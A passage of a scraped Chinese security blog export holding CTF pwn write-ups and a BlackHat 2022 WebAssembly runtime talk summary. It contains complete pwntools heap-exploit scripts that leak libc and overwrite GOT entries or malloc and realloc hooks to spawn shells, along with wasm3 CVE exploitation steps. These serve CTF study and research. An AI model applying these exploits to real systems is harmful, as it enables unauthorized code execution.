create(0x80,&#x27;chunk0&#x27;,0x80,&#x27;a&#x27;*0x80)  create(0x80,&#x27;chunk1&#x27;,0x80,&#x27;b&#x27;*0x80)  #存放/bin/sh字符串  create(0x10,&#x27;chunk2&#x27;,0x8,&#x27;/bin/sh\\x00&#x27;)    &#x27;&#x27;&#x27;&#x27;&#x27;现在的堆是这样分布的 description0 chunk size:0x80 node0 chunk size:0x80 description1 chunk size:0x80 node1 chunk size:0x80 description2 chunk size:0x8 node2 chunk size:0x80 &#x27;&#x27;&#x27;    delete(0)  &#x27;&#x27;&#x27;&#x27;&#x27;现在的堆是这样分布的  0x80*2大小的空闲块  description1 chunk size:0x80 node1 chunk size:0x80 description2 chunk size:0x8 node2 chunk size:0x80 &#x27;&#x27;&#x27;      create(0x100,&#x27;chunk3&#x27;,0x19C,&#x27;c&#x27;*0x198 + p32(elf.got[&#x27;free&#x27;]))  &#x27;&#x27;&#x27;&#x27;&#x27;现在的堆是这样分布的 description2 chunk size:0x100 0x80*2 - 0x100 大小的空闲块 description1 chunk size:0x80 node1 chunk size:0x80 description2 chunk size:0x8 node2 chunk size:0x80 node3 chunk size:0x80 node3-4是node2的尾部，那么，我们绕过了溢出检测，即我们可以在description2 chunk里输入数据，一直可以到node2结尾 那么，我们就把node1的description指针值覆盖为free的got表地址，那么当我们printf description的内容时，输出的就是 free的加载地址 &#x27;&#x27;&#x27;  show(1)    sh.recvuntil(&#x27;description: &#x27;)    free_addr = u32(sh.recv(4))    libc = LibcSearcher(&#x27;free&#x27;,free_addr)    #获取libc加载地址  #libc_base = free_addr - libc.sym[&#x27;free&#x27;]  #system_addr = libc_base + libc.sym[&#x27;system&#x27;]    libc_base = free_addr - libc.dump(&#x27;free&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)    #修改free的got表地址为system的地址  edit(1,4,p32(system_addr))  #getshell，相当于system(heap[2])  delete(2)    sh.interactive()  \n\n然而，在libc2.26及以上，不能用，因为tcache机制，使用单项链表维护，并且遵循后进先出规则，并且块不会合并。因此本人还未找到libc2.26及以上的方案，如果大佬有解决方案，欢迎联系我。\n","categories":["CTF"],"tags":["glibc <= 2.26","堆溢出","堆风水"]},{"title":"Babyheap","url":"/2019/11/20/babyheap/","content":"首先，检查一下程序的保护机制,保护全开\n\n\n然后用IDA分析，发现在创建并读入数据时，有一个null off by one漏洞\n\n\n我们所能利用的也就是这个漏洞\n第一步仍然是想办法泄露一些关键地址\n由于可以溢出一字节的0数据到下一个chunk，以前，我们阅读glibc内存管理，知道了**chunk空间的共用情况，也就是[下一个的chunk的prev_size域给当前chunk当做数据域使用]{.mark}，这种情况只出现在malloc的大小为8的奇数倍(32为4的奇数倍)的情况。考虑到unsorted bin的表头会有libc中的[main_arena+88的地址，]{.mark}**因此我们首先肯定得创建一些unsorted bin。\n现在，假如我们创建了几个堆\n#chunk0  create(0x100,&#x27;a&#x27;*0x100)  #chunk1  create(0x100,&#x27;b&#x27;*0x100)  #chunk2  create(0x68,&#x27;c&#x27;*0x68)  #chunk3  create(0x68,&#x27;d&#x27;*0x68)  #chunk4  create(0x100,&#x27;e&#x27;*0x100)  \n\n堆布局如下\n\n\n其中,chunk0、chunk1、chunk4大小在unsorted bin范围，当他们free后就进入了unsorted bin，并且相邻的chunk会进行unlink合并。既然能够溢出一字节0数据，那么**[假如我们从chunk3中溢出，覆盖chunk4的size域的低一字节为0，那么就标志了chunk4的前一chunk处于空闲状态]{.mark}，那么，[当我们free chunk4的时候，chunk4就会与它的前一chunk合并]{.mark}**，而它的前一chunk是如何取到的呢，看看glibc源码\n/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */  #define prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))  \n\n也就是依赖于prev_size，由于chunk3的大小为0x68，是8的奇数倍，因此它会把chunk4的prev_size域作为数据域，因此,prev_size我们可以自己指定大小\n假如，我们在chunk3中，[把chunk4的prev_size设置为(0x110+0x110+0x70+0x70 &#x3D; 0x300)，然后覆盖chunk4的size低1字节为0]{.mark},那么,当我们delete(4)时，就会合并chunk4和chunk4-0x300处的chunk，也就是会合并chunk0、chunk1、chunk2、chunk3、chunk4\n由于**[没有编辑功能，我们只能delete(3)后再重新create分配到那个位置，同时构造payload溢出到chunk4]{.mark}**\n由于合并时,unlink会报错，因此，我们在事先，应该delete(0)，让chunk0加入unsorted bin中。delete(2)用于将chunk2放入fastbin，供后续fastbin attack使用，[注意，必需在合并chunk0、chunk1、chunk2、chunk3、chunk4之前让chunk2加入fastbin]{.mark}，合并后再delete(2)不能让chunk2加入到fastbin中\n#chunk2用于放入fastbin  delete(2)  #chunk3用于溢出  delete(3)  #chunk0用于加入unsorted bin，并且让main_arena+88指针存入fd和bk  delete(0)    #把chunk3申请回来，并off by one null到chunk4,覆盖chunk4的低1字节为0  payload = &#x27;e&#x27;*0x60  #prev_size  payload += p64(0x300)  create(0x68,payload)  \n\n现在堆的布局是这样子的\n\n\n接下来，我们delete(4)，chunk0~chunk4发生合并，合并后chunk0作为unsorted bin表头fd、bk值仍然指向main_arena+88\n然而，当我们实际操作时,delete(4)时出现了报错\n\n\n我们看看glibc源码\n\n\n\n\n\n\n还记得chunk4的size被我们覆盖成了0x100吗，原本是0x111的，也就是说，[现在取到的nextsize是chunk4数据域里偏移0x90+8处的数据，而不是下一个chunk的size，]{.mark}\n为了避免后续的其他类似的错误，我们把chunk4留下的那(0x110-0x100&#x3D;0x10的空间伪装成一个chunk5)\n所以，在一开始创建chunk4的应该应该这样写\n#chunk4的创建，后0x10空间用于伪装出一个假chunk5  create(0x100,&#x27;e&#x27;*(0x100-16) + p64(0x100) + p64(0x11))  \n\n现在，我们再查看堆的布局情况(pwndbg attach 到pid上，然后输入bin命令)\n\n\n现在发现，fastbin里的那个就是我们的chunk2，待会fastbin attack用到\n而unsorted bin里就一个节点(chunk0)，中间那个是main_arena+88，它们组成了双向链表\n现在，假如我们create(0x100)，那么glibc就会从unsorted bin中的表头(chunk0)处开始，切割出0x110的空间给我们，然后表头变成了chunk0+0x110\n\n\n并且chunk0+0x110处开始作为一个chunk,[它的fd和bk会被设置为main_arena+88]{.mark}，\n但是，你发现了什么，chunk0 + 0x110不就是chunk1吗，还记得[chunk1并没有被我们free，它只是参与了合并，]{.mark}因此它的指针存在于数组中，并没有被清0\n\n\n那么，当我们show()的时候，就会把chunk1的fd值打印出来，从而泄露了main_arena+88的地址\n\n\n[由于main_arena+88和malloc_hook物理位置上在同一页，并且靠的很近，因此，它们的地址只有后三位不一样]{.mark}，那么我们就能计算出malloc_hook的地址，然后就能计算出libc基地址，从而获取gadget的地址\n#申请掉chunk0后，main_area+88指针放到了chunk1的fd和bk处  create(0x100,&#x27;a&#x27;*0x100)    show()    sh.recvuntil(&#x27;1 : &#x27;)    main_area_88 = u64(sh.recvuntil(&#x27; &#x27;).split(&#x27; &#x27;)[0].ljust(8,&#x27;\\x00&#x27;))  #低字节覆盖获得malloc_hook的地址  malloc_hook_addr = (main_area_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_s_hook &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_s_hook  realloc_addr = libc_base +  realloc_s  gadget_addr = libc_base + gadget  print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)  print &#x27;realloc_addr=&#x27;,hex(realloc_addr)  print &#x27;gadget_addr=&#x27;,hex(gadget_addr)  \n\n现在一些需要的信息我们都得到了，我们接下来是想办法把gadget的地址写入到malloc_hook里，这样当程序再次malloc时，便会触发gadget，从而get shell\n现在我们用fastbin attack，fastbin attack能让我们把堆申请到malloc_hook-0x23处，知道我们的chunk2为什么申请时设置为0x68的大小吗，因为实际创建的大小是0x70，而malloc_hook-0x23处偏移0x8处的数据为0x7F，与0x70大小相当\n\n\nfastbin只检查chunk的size域是否符合要求，因此，我们的chunk2的size要与它大小相当，这样，我们想办法把chunk2的fd指向malloc_hook-0x23这个假chunk处，这样，chunk2和malloc_hook-0x23处构成了单向链表，当我们第二次申请0x68大小的堆时，就会申请到malloc_hook-0x23处，更多详细知识见我的博客https://blog.csdn.net/seaaseesa/article/details/103057937\n那么如何才能修改到chunk2的fd域呢？我们可以利用**[堆重叠]{.mark}**\n假如我们create(0x118,payload),由于之前已经create(0x100)过一次，那么这次chunk分配的范围就是chunk0 + 0x110 ~ chunk0+0x110+0x128也就是chunk1~chunk2+0x18处，正好可以把chunk2的fd给覆盖了，如果觉得麻烦，直接申请大点，不用这么精确\n#现在用fastbin attack  #堆重叠，修改chunk2的fd指针  payload = &#x27;g&#x27;*0x100  payload += p64(0) + p64(0x71)  payload += p64(malloc_hook_addr-0x23)  create(0x118,payload)  \n\n现在，我们再看看堆的布局\n\n\nmalloc_hook-0x23处成功链入fastbin，那么当我们第二次申请0x68大小空间时就能申请到这里\n#第一次申请  create(0x68,&#x27;h&#x27;*0x68)  #修改malloc_hook  payload = &#x27;\\x00&#x27; * 0x13 + p64(gadget_addr)  payload += &#x27;\\n&#x27;  #第二次申请  create(0x68,payload)  \n\n这样，看似已经可以了，我们只需再触发一次malloc，即可getshell\n#触发malloc_hook getshell  sh.sendlineafter(&#x27;Your choice :\\n&#x27;,&#x27;1&#x27;)  sh.sendlineafter(&#x27;Size:&#x27;,&#x27;1&#x27;)&#x27;&#x27;&#x27;  \n\n然而，gadget变得不可用,执行不成功\n\n\n[以下两段来自看雪论坛]{.mark}https://bbs.pediy.com/thread-246786.htm\n[有些情况下one_gadget因为栈环境原因全部都不可用，这时可以通过realloc_hook来调整堆栈环境使one_gadget可用。realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。realloc_hook同malloc_hook相邻，故可通过fastbin attack一同修改两个值。]{.mark}\n如何利用realloc_hook来调整栈环境呢？\n观察realloc函数的流程push寄存器，最后全部pop出来跳转至realloc_hook的值。\n[因此可以将realloc_hook设置为选择好的one_gadget，将malloc_hook设置为realloc函数开头某一push寄存器处。push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。这时one_gadget就会可以使用。具体要压低栈多少要根据环境决定，这里我们可以进行小于48字节内或72字节的堆栈调整。]{.mark}\n经过测试，我们只需在realloc函数地址向下偏移2就可以使栈环境正常\n\n\n于是，我们修改后的代码\n#修改realloc_hook和malloc_hook  payload = &#x27;\\x00&#x27; * 0xB + p64(gadget_addr) + &#x27;\\x00&#x27;*(0x13-0xB-0x8)  #用于堆栈调整  payload += p64(realloc_addr + 2)  payload += &#x27;\\n&#x27;  #第二次申请  create(0x68,payload)  \n\n最终，我们写出了如下的exp脚本\n#coding:utf8  from pwn import *  from one_gadget import *    context.log_level = &#x27;debug&#x27;  sh = process(&#x27;./timu&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,57745)  libc_path = &#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;  libc = ELF(libc_path)  #malloc_hook的静态地址  malloc_s_hook = libc.symbols[&#x27;__malloc_hook&#x27;]  #realloc函数的静态地址  realloc_s = libc.sym[&#x27;realloc&#x27;]  #gadger  g = generate_one_gadget(libc_path)  gadget = g.next()    #sh = remote(&#x27;111.198.29.45&#x27;,41803)    def create(size,content):     sh.sendlineafter(&#x27;Your choice :\\n&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Size:&#x27;,str(size))     sh.sendafter(&#x27;Data:&#x27;,content)    def delete(index):     sh.sendlineafter(&#x27;Your choice :\\n&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;Index:&#x27;,str(index))    def show():     sh.sendlineafter(&#x27;Your choice :\\n&#x27;,&#x27;3&#x27;)      #chunk0  create(0x100,&#x27;a&#x27;*0x100)  #chunk1  create(0x100,&#x27;b&#x27;*0x100)  #chunk2  create(0x68,&#x27;c&#x27;*0x68)  #chunk3  create(0x68,&#x27;d&#x27;*0x68)  #chunk4  #特别！！chunk4后面0x10空间用于伪装假chunk5  create(0x100,&#x27;e&#x27;*(0x100-16) + p64(0x100) + p64(0x11))    #chunk2用于放入fastbin  delete(2)  #chunk3用于溢出  delete(3)  #chunk0用于加入unsorted bin，并且让main_arena+88指针存入fd和bk  delete(0)    #把chunk3申请回来，并off by one null到chunk4,覆盖chunk4的低1字节为0  payload = &#x27;e&#x27;*0x60  #prev_size  payload += p64(0x300)  create(0x68,payload)  #0、1、2、3、4堆块合并  delete(4)    #申请掉chunk0后，main_area+88指针放到了chunk1的fd和bk处  create(0x100,&#x27;a&#x27;*0x100)  show()  sh.recvuntil(&#x27;1 : &#x27;)    main_area_88 = u64(sh.recvuntil(&#x27; &#x27;).split(&#x27; &#x27;)[0].ljust(8,&#x27;\\x00&#x27;))  #低字节替换获得malloc_hook的地址  malloc_hook_addr = (main_area_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_s_hook &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_s_hook  realloc_addr = libc_base +  realloc_s  gadget_addr = libc_base + gadget  print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)  print &#x27;realloc_addr=&#x27;,hex(realloc_addr)  print &#x27;gadget_addr=&#x27;,hex(gadget_addr)      #现在用fastbin attack  #堆重叠，修改chunk2的fd指针  payload = &#x27;g&#x27;*0x100  payload += p64(0) + p64(0x71)  payload += p64(malloc_hook_addr-0x23)  create(0x118,payload)    #第一次申请  create(0x68,&#x27;h&#x27;*0x68)  #修改realloc_hook和malloc_hook  payload = &#x27;\\x00&#x27; * 0xB + p64(gadget_addr) + &#x27;\\x00&#x27;*(0x13-0xB-0x8)  #用于堆栈调整  payload += p64(realloc_addr + 2)  payload += &#x27;\\n&#x27;  #第二次申请  create(0x68,payload)  #触发malloc_hook getshell  sh.sendlineafter(&#x27;Your choice :\\n&#x27;,&#x27;1&#x27;)  sh.sendlineafter(&#x27;Size:&#x27;,&#x27;1&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["unsorted bin","fastbin","malloc_hook","off by one","realloc_hook"]},{"title":"babyheap_hitcon_2016","url":"/2020/07/24/babyheap_hitcon_2016/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，输入函数存在off by null漏洞\n\n\n通过这个off by null，可以将content指针低1字节覆盖为0，也就是相当于content指向的地方在上方去了。\n\n\n因此，我们只需要在上方的位置，伪造一个合适的chunk，然后free掉，这样，unsorted bin和fastbin就有重合了。\n程序中，仅仅关闭了stdout的缓冲区，没有关闭stdin的缓冲液\n\n\n因此，通过功能4，我们可以初始化stdin的缓冲区，我们可以首先就初始化它的缓冲区，然后在创建节点，这样content指针低1字节覆盖后，正好可以指向stdin缓冲区的内部，我们就可以利用scanf将伪造的chunk’数据输进去。\n\n\n构造了overlap chunk以后，就可以通过伪造节点的content指针，达到任意地址读写，为了多次利用edit，利用第一次edit将exit的got表修改为其他函数，只要保证不崩溃，不退出即可。\n\n\n然后就可以利同样的方法，泄露地址，写got表来getshell\n#coding:utf8from pwn import *#context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./babyheap_hitcon_2016&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26537)elf = ELF(&#x27;./babyheap_hitcon_2016&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]read_plt = elf.plt[&#x27;read&#x27;]exit_got = elf.got[&#x27;_exit&#x27;]def add(size,content,name):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size :&#x27;,str(size))   sh.sendafter(&#x27;Content:&#x27;,content)   sh.sendafter(&#x27;Name:&#x27;,name)def delete():   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;2&#x27;)def edit(content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;3&#x27;)   sh.sendafter(&#x27;Content:&#x27;,content)def Exit(c):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;4&#x27;)   sh.sendafter(&#x27;Really?&#x27;,c)Exit(&#x27;n\\n&#x27;)#null off by oneadd(0x100,p64(0) + p64(0x101) + &#x27;a&#x27;*0xF0,&#x27;b&#x27;*0x8)#通过stdout的缓冲区，将伪造的chunk布置到上方Exit(&#x27;n &#x27;.ljust(0xFE0,&#x27;a&#x27;) + p64(0) + p64(0x51) + &#x27;\\n&#x27;)#形成overlap chunkdelete()#控制节点结构体的数据add(0x40,&#x27;a&#x27;*0x20 + p64(0x200) + &#x27;b&#x27;*0x8 + p64(exit_got),&#x27;b&#x27;*0x7)#修改exit的got表为任意不崩溃函数，atoi的got表修改为printf_pltpayload = p64(read_plt) #exitpayload += p64(0x400756) #read_chkpayload += p64(0x400766) #putspayload += p64(0x400776) #_stack_chk_failpayload += p64(0x400786) #printfpayload += p64(0x400796) #alarmpayload += p64(0x4007A6) #readpayload += p64(0x4007B6) #_libc_start_mainpayload += p64(0x4007C6) #_signalpayload += p64(0x4007D6) #_mallocpayload += p64(0x4007E6) #_setvbufpayload += p64(printf_plt) #_atoiedit(payload)sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;%7$p&#x27;)sh.recvuntil(&#x27;0x&#x27;)libc_base = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16) - 0x16A - libc.sym[&#x27;puts&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#控制rax为3，这样我们就可以进入选项3，继续编辑了sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;a&#x27;*0x2)#修改atoi的got表为system_addrpayload = p64(read_plt) #exitpayload += p64(0x400756) #read_chkpayload += p64(0x400766) #putspayload += p64(0x400776) #_stack_chk_failpayload += p64(0x400786) #printfpayload += p64(0x400796) #alarmpayload += p64(0x4007A6) #readpayload += p64(0x4007B6) #_libc_start_mainpayload += p64(0x4007C6) #_signalpayload += p64(0x4007D6) #_mallocpayload += p64(0x4007E6) #_setvbufpayload += p64(system_addr) #_atoish.sendlineafter(&#x27;Content:&#x27;,payload)#getshellsh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;/bin/sh&#x27;)sh.interactive()","categories":["CTF"],"tags":["unsorted bin","fastbin","off by one","IO FILE"]},{"title":"bcloud_bctf_2016(house of force)","url":"/2020/04/17/bcloud_bctf_2016/","content":"首先检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，主逻辑里面没有什么问题\n\n\n漏洞点在于最开始的地方，输入name的时候，由于malloc是在输入之后，因此，v2处s的0截断字符会被覆盖为堆指针，从而strcpy的时候把堆指针的值也复制进去，造成了堆地址泄露。\n\n\n另一个漏洞在于这里，也是同样的问题，可以造成top chunk的size被修改为v3的值。\n\n\n由于程序没有开启PIE。因此top chunk与程序段间的offset我们就能计算出来了。达到了house of force的条件，我们将top chunk移到堆指针数组处，然后分配一个堆，就能自由控制堆指针数组，实现任意地址读写。\n#coding:utf8from pwn import *from LibcSearcher import *#house of  force#sh = process(&#x27;./bcloud_bctf_2016&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25777)elf = ELF(&#x27;./bcloud_bctf_2016&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]free_got = elf.got[&#x27;free&#x27;]heap_array_addr = 0x0804B120sh.sendafter(&#x27;Input your name:&#x27;,&#x27;a&#x27;*0x40)sh.recvuntil(&#x27;a&#x27;*0x40)heap_addr = u32(sh.recv(4))print &#x27;heap_addr=&#x27;,hex(heap_addr)sh.sendafter(&#x27;Org:&#x27;,&#x27;a&#x27;*0x40)#修改top chunk的sizesh.sendlineafter(&#x27;Host:&#x27;,p32(0xFFFFFFFF))top_chunk_addr = heap_addr + 0xD0print &#x27;top_chunk_addr=&#x27;,hex(top_chunk_addr)def add(size,content):   sh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Input the length of the note content:&#x27;,str(size))   sh.sendafter(&#x27;Input the content:&#x27;,content)def edit(index,content):   sh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Input the id:&#x27;,str(index))   sh.sendafter(&#x27;Input the new content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Input the id:&#x27;,str(index))offset = heap_array_addr - top_chunk_addr - 0x10add(offset,&#x27;&#x27;) #0#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了add(0x18,&#x27;\\n&#x27;) #1#修改heap_arrayedit(1,p32(0) + p32(free_got) + p32(puts_got) + p32(0x0804B130) + &#x27;/bin/sh\\x00&#x27;)#修改free的got表为puts的plt表edit(1,p32(puts_plt) + &#x27;\\n&#x27;)#泄露puts的地址delete(2)sh.recv(1)puts_addr = u32(sh.recv(4))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#修改free的got表为system地址edit(1,p32(system_addr) + &#x27;\\n&#x27;)#getshelldelete(3)sh.interactive()","categories":["CTF"],"tags":["堆溢出","top chunk","house of force"]},{"title":"blackhat_usa_2022_WebAssembly","url":"/2022/08/12/blackhat-usa-2022-WebAssembly/","content":"WebAssembly被用在浏览器、嵌入式、云计算等领域，它使用虚拟机和字节码技术，因此能够在多平台运行无需重新编译。之前也有许多有关WebAssembly的议题出现在BlackHat大会上，经过分析，它们大多是针对程序编译为WASM以后，这个程序的行为、漏洞能否利用等方面进行的研究。比如一个程序原本具有栈溢出，但是编译为WASM文件后运行，由于WASM的架构和运行方式，使得这个程序的栈溢出消失或者变得无法利用。而我们的研究，则是侧重于如何挖掘WASM运行时的漏洞以及如何对WASM虚拟机方面的漏洞进行利用，并总结出通用的漏洞挖掘方向和利用思路。\n\n\nWebAssembly运行时的架构标准如图，首先通过parser对wasm文件进行解析，将它们解析为一个虚拟机实例，虚拟机用于两种堆栈，一个是pc堆栈，用于存储跟wasm虚拟机控制流有关的指令结构体或者函数指针等；另一个是sp堆栈，用于存储wasm程序中使用到的数据，比如变量、常量等。\npc堆栈是在parser阶段就确定好了的，指令运行时，所有的数据访问操作都只发生在sp堆栈和其他一些存储区。因此，传统的c语言溢出程序编译为wasm后，发生的溢出只影响了sp堆栈中的数据，程序流程不受影响，所有的指令访存的操作在虚拟机中的实现代码中都会进行边界检查。\nfunctions、tables、memories等对象可以通过import节进行导入,WASM虚拟机会解析import节并导入相关的对象，WASI是系统功能接口，类似于C语言下的syscall，里面提供了一些操作系统的函数，比如read/write等，WASI也是通过import节进行导入的，虚拟机在解析节的时候会根据import表导入对应的WASI函数，WASI函数不同的WASM虚拟机有不同的实现，都会有权限限制，比如open等只能限制访问设定好的目录等。\nWASM轻量化的虚拟机，并且还有WASI的加持，因此它能够当作容器，Docker的作者也曾经开玩笑说如果WASI早点出现，docker也许不会存在，这也说明了WASM+WASI具有较好的前途。\n\n\n通过分析，我们确定了三处最有可能出现的地方，第一个是Parser解析模块，这里主要是在解析WASM文件时可能会出现一些漏洞，对于这方面，AFL等现有工具非常适合对文件结构进行Fuzz；第二个是WASI接口函数，第三个则是字节码实现方面的边界检查器可能出现漏洞。\n\n\n我们针对上面三处可能出现漏洞的地方，设计了一款专门的Fuzz工具。现有的Fuzz工具不能很好的测试WASI和字节码实现方面的漏洞，因为这两方面的样本在构造时需要考虑上下文关系，比如一个字节码i32.store，这个指令是操作内存的，前提是必须要有一个memory的section存在，如果没有，则i32.store总是报没有memory对象存在，那么测试就不能深入下去；同理，对于WASI函数，首先需要构造一个import表将需要的函数导入，然后再使用字节码call去调用；这些上下文关系在现有的模糊测试中很难探测到。因此，我们需要自己开发Fuzz工具，将上下文考虑进去。\n实际上，我们是设计了一个WASM生成器，它从测试器生成的样本中读入数据，然后生成对应的wasm文件，可以说，每一个独立的样本都有一个与之对应的wasm文件，这是一种映射关系，那么当样本稍微改变以后，对应的wasm文件也会改变，因此生成的wasm文件具有覆盖率引导性。覆盖率引导的模糊测试是当今流行的高效测试方法，那么我们有了覆盖率引导的wasm文件样本后，测试也会高效。\n\n\n\n\n我们是如何实现生成器的呢？我们分为三个方面，首先来看如何生成WASM文件。\n我们将WASM文件抽象为一个类，那么它由N个section组成，每种不同的section中由各自的数据结构，结构中，有些字段可以随意的改变，有些字段只能是区间范围值，有些则是固定值。\n\n\n我们将这些规则写到生成器中，用于限定数据的生成。为了便于实现，我们抽象出Section类，对于每种不同类型的Section，我们实现不同的Section子类来处理各自的字段限定情况。其中generate函数用于生成当前Section对象中的数据，这个过程，它会从样本中读入数据，并根据数据的值来做不同的数据生成。getEncode函数用于将当前Section对象输出为WASM文件中的Section结构。\n\n\n为了说明数据是如何生成的，下面举一个例子\n比如我们要生成一个整数，我们使用一个策略化的方面，首先，我们从sample文件中读入一个数据，并转化为整数，在这里用到了range(0,6)，它是读入了一个整数，然后将整数进行了求余得到的区间数，根据这个数，我们返回不同的数据，比如是7的时候，我们通过range(0,50000)读入整数并计算一个区间数，是5的时候，返回一个边界值0xffffffff等。因为所有的数据跟样本都具有对应性，因此是覆盖率引导的。\n\n\n\n\n接下来，我将要介绍如何对字节码进行Fuzz\n我们根据WASM标准文档，提取所有的字节码，对于每一个不同类型的字节码，我们都实现一个对应的Instruction子类用来限定它们的一些参数，如图代码，generate函数用于生成当前对象中的数据，其中Context类用于保存上下文，比如某个字节码会影响上下文，那么我们在generate中数据生成好时，就把上下文数据更新到context对象中去，以后供其他指令生成使用；getBytecode函数用于将字节码对象输出为WASM文件中字节码的结构数据。\n\n\n下面说明如何限定一个字节码的数据生成行为，比如字节码Call，在generate的实现如下，我们想要避免call self这类的指令生成，因为这是递归调用，而在Fuzz中往往很难生成递归的退出条件，如果有call self出现，会导致虚拟机进入死循环，那么也就不能更好的测试这个语句后方的代码。因此我们直接将这种情况剔除，我们记录call的起点函数和目标函数，将它们以点表示放置与矩阵中，每次generate时，我们使用DFS算法检查当前生成的样本call f.value是否会造成流程的死循环，如果是的话我们将f.value加1，直到不再死循环。\n\n\n\n\n接下来，介绍如何对WASI函数进行Fuzz\n由于WASI是通过import section导入的，因此我们在生成器的ImportSection类中进行实现，首先我们有一个初始函数initImportsFunction，在这里，我们提前把所有的WASI函数名字符串添加到列表中，作为一个候选列表。\n在ImportSection的数据生成函数generate中，我们根据从样本中读入的区间整数，从候选列表中选择一个函数名字符串，将其作为import节中的name字段。\n这种候选列表数据生成方式，减少了Fuzz工具探索固定字符串的无用功。\n\n\n在字节码中，由于call会随机生成目标函数的下标，因此我们导入的WASI函数会被调用到，从而能够进行测试。\n下面展示这个生成器是怎么使用的，如图，通过new WasmStructure(Data,Size)将原始的样本数据映射为WASM文件数据，然后输出，并喂给目标程序进行测试。\n\n\n\n\n接下来将要介绍我们发现的漏洞以及漏洞的巧妙利用手法。\n首先是CVE-2022-28990，这是wasm3这款解释器的漏洞。如图，buf和buflen直接从参数中的wasiiovs中转化的，这个参数在底层是一个整数，代表数据位于memory对象中的偏移。因此这里代码实际上就是直接从memory中读取对应的数据并通过转化赋值给buf和buflen，它们没有做任何的边界检查。于是，接下来对buf进行读取时能够进行溢出，这是一个堆溢出。\n\n\n具体的POC如下，首先通过i32.store布置好memory中的数据，然后调用fd_write，可以看到，我们布置的memory中，wasiiovs offset为0x10000，那么在实现函数中，转为指针就是&amp;memory + 0x10000。\n\n\n在漏洞利用之前，我还需要介绍一下wasm3解释器的具体架构实现，wasm3的pc stack中，存储的是指令的实现函数，每一条指令，都有一个底层的实现函数，这些实现函数的地址被保存到pc stack中，对于每一个参数，它们存储在sp stack中，pc stack中存储的是参数数据在sp stack中的下标，这里也叫做slot。\n要想控制虚拟机的程序流，我们想要劫持pc stack，因此，通过Heap Spray布置内存布局，让pc stack位于memory的后方，这样我们就可以溢出到pc stack了，然后可以布置下一些gadgets完成代码执行。\n\n\ngadgets比较难找，有时候找不到合适的，这里介绍一种方法，利用global.get和global.set的实现函数来完成任意地址读写。如图，在SetGlobal_i64函数中，从pc stack中取了一个立即数并转化为指针，然后写入数据。当我们控制了pc stack中，我们就布置SetGlobal_i64和目标地址，就能够往目标地址处写数据了，同理使用GetGlobal_i64实现任意地址读。\n\n\n更难的挑战，如何在Android上成功利用，安卓使用了scudo分配器，通过调试发现pc stack的地址总是位于memory的前方，这意味着在memory中溢出不到pc stack了，得想办法进行堆布局，那么有什么办法呢？\n\n\n通过分析代码实现，我们发现wasm3使用了PagePC的概念，即用了多个pc stack，当一个pc stack被填满以后，会申请一个新的pc stack，所有这些pc stack通过尾部的jmp指令相互连接起来。我们发现在解析br_table指令时，只要参数够多，就能够填满pc stack，那么我们通过这种方式来完成pc stack的堆喷。\n\n\n堆喷以后，我们布置好布局后就能够溢出到pc stack然后伪造好SetGloabl和GetGlobal完成任意地址读写。\n\n\n\n\n接下来介绍的漏洞是CVE-2022-34529，slot missing in bytecode，这也是wasm3解释器的一个漏洞，来看一下mem.fill指令的解析和实现函数，可以看到它需要3个参数，其中第一个参数位于_r0，其它的则位于slot插槽。看一下Compile_Memory_CopyFill函数，在解析时，首先往pc 